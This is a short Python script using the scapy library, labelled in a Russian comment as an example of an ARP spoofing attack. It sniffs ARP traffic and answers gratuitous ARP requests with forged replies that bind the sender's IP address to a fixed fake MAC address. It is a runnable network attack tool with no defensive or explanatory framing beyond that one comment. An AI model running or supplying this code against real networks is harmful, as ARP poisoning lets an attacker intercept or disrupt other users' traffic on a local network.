# Этот скрипт является примером атаки "ARP spoofing" (ARP-спуфинг).

from scapy.all import ARP, send, sniff

def arp_callback(pkt):
    # Gratuitous ARP request?
    if pkt[ARP].op == 1 and pkt[ARP].psrc == pkt[ARP].pdst:
        send(ARP(op=2, psrc=pkt[ARP].psrc, pdst=pkt[ARP].pdst, hwsrc="00:01:02:03:04:05", hwdst=pkt[ARP].hwsrc))

# Sniff only ARP packets
sniff(filter="arp", prn=arp_callback)